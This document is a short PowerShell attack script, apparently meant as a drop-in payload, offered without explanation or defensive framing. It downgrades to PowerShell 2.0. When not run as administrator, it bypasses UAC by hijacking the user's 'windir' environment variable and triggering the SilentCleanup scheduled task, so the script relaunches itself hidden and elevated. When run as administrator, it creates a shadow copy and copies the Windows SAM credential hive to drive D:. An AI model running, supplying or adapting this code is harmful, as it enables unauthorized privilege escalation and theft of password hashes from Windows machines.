if ($PSVersionTable.PSVersion -ne [Version]"2.0") {
    # Re-launch as version 2 if we're not already
    powershell -v 2.0 -File .\bee2.ps1
    exit
  }
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
        $syslink1 = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
        $syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
        $directory = $syslink2.DeviceObject + "\\"
        cmd /c mklink /d C:\shadowcopy "$directory"
        Start-Sleep -s 1
        copy-item -path "C:\shadowcopy\windows\system32\config\SAM" -destination "D:" -Recurse
        cmd /c rmdir C:\shadowcopy
        Start-Sleep -s 1
    #It'll run as Administrator
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    Start-Sleep -s 1
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Start-Sleep -s 1
    Remove-ItemProperty -Path $registryPath -Name $name
}
